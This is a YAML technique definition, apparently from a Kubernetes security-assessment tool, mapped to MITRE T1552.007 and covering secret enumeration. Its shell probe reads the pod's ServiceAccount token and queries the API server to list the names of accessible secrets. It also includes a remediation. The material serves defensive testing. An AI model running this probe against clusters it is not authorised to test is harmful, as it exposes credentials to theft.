# Technique: Secret enumeration via API
# ID: C2
# Tactic: Credential Access
# Uses the pod's SA token to list secrets via the K8s API.

id: C2
name: Secret enumeration via API
enabled: true

mitre:
  technique_id: T1552.007
  technique_name: "Unsecured Credentials: Container API"
  tactic: credential-access
  data_sources: [Container, User Account]

cis_controls:
  - "5.1.2"  # Minimize access to secrets
  - "5.1.3"  # Minimize wildcard use in Roles

severity: critical

description: |
  Uses the pod's mounted ServiceAccount token to query the Kubernetes API
  for secrets in the namespace. Reports the count and names of accessible
  secrets. Database credentials, API keys, and TLS certificates are commonly
  exposed through this vector.

execution:
  mode: exec
  requires_target_pod: true

  probes:
    - type: command
      run: |
        SA_DIR="/var/run/secrets/kubernetes.io/serviceaccount"
        if [ ! -f "$SA_DIR/token" ]; then echo "NO_TOKEN"; exit 0; fi
        TOKEN=$(cat "$SA_DIR/token")
        NS=$(cat "$SA_DIR/namespace")
        API="https://kubernetes.default.svc.cluster.local"
        RESP=$(wget -q -O- --header="Authorization: Bearer $TOKEN" \
            --no-check-certificate "$API/api/v1/namespaces/$NS/secrets" 2>&1)
        if echo "$RESP" | grep -q '"items"'; then
            COUNT=$(echo "$RESP" | grep -c '"name"' || true)
            echo "SECRET_COUNT:$COUNT"
            echo "$RESP" | grep '"name"' | head -10 | \
                sed 's/.*"name": "\(.*\)".*/SECRET_NAME:\1/'
        else
            echo "ACCESS_DENIED"
        fi

  evidence_markers:
    - marker: "SECRET_COUNT"
      evidence: "SA can enumerate secrets in namespace"
      impact: "Database credentials, API keys, and TLS certificates exposed"
    - marker: "SECRET_NAME"
      evidence: "Individual secret name discovered"
    - marker: "ACCESS_DENIED"
      evidence: "API server denied secrets access to this SA"
    - marker: "NO_TOKEN"
      evidence: "No SA token mounted in pod"

success_indicators:
  - "SECRET_COUNT"

impact:
  - "Database credentials, API keys, and TLS certificates exposed"
  - "Secrets can be base64-decoded to obtain plaintext values"
  - "Enables chain to L6 (data store access) with stolen credentials"

remediation: |
  Remove secrets list/get from the ServiceAccount's Role. Use specific
  resourceNames if the SA needs access to particular secrets.
